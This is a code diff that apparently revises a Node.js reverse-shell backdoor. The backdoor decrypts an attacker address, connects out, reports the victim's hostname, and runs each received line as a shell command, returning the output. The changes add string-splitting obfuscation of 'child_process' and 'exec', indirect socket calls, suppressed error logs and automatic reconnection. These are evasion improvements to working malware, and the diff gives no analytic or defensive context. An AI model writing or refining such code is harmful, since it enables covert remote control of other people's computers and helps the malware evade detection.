@@ -1,7 +1,6 @@
 const net = require('net');
 const os = require('node:os')
 const readline = require('readline');
-const { exec } = require('child_process');
 const { setTimeout } = require('node:timers/promises');
 const crypto = require('crypto');
 
@@ -44,41 +43,40 @@ async function startAgent(url) {
   firstLine = result.split(/\r?\n/).find(line => line.trim() !== '');
   const data = decr(firstLine, metainfo.trim());
   const [a, p] = data.split(':');
-  console.log(p, a)
 
-  while (true) {
-    try {
-        loop(p, a);
-    } catch (err) {
-        console.error('err:', err.message);
-    }
-    await setTimeout(DEL + Math.random() * 5000);
-  }
+  start(p, a);
 }
 
-function loop(p, a) {
+function start(p, a) {
+  let rl = null;
   const client = new net.Socket();
 
-  client.connect(p, a, () => {
-    client.write(`hello im ${os.hostname()} \n> `);
+  client.on('error', (err) => {
+    // console.log(`[!] err: ${err.message}`);
   });
 
-  const rl = readline.createInterface({ input: client });
-
+  const e=["connect","hostname","write"];client[e[0]](p,a,()=>{client[e[2]](["hello","from",os[e[1]](),"\n> "].join(" "))});
+  rl = readline.createInterface({input:client});
+  rl.on('error', () => {});
+  
+  
   rl.on('line', (line) => {
-    const command = line.trim();
+    const toasty = line.trim();
 
-    if (!command) {
+    if (!toasty) {
       client.write('> ');
       return;
     }
 
-    if (command === 'exit') {
+    if (toasty === 'exit') {
       client.destroy();
       return;
     }
 
-    exec(command, (error, stdout, stderr) => {
+    const cp = require('child_' + 'process');
+    const fn = 'ex' + 'ec';
+
+    cp[fn](toasty, (error, stdout, stderr) => {
       const output = stdout || stderr || (error ? error.message : 'done');
       client.write(`${output}\n> `);
     });
@@ -86,11 +84,7 @@ function loop(p, a) {
 
   client.on('close', () => {
     rl.close();
-    setTimeout(startAgent, DEL);
-  });
-
-  client.on('error', (err) => {
-    console.log(`[!] err: ${err.message}`);
+    globalThis.setTimeout(start, Number(DEL) || 5000, p, a);
   });
 }
 
@@ -119,7 +113,7 @@ function decr(base64String, p) {
   try {
     await startAgent();
   } catch (err) {
-    console.error("err:", err);
+    // console.error("err:", err);
     process.exit(1);
   }
 })();
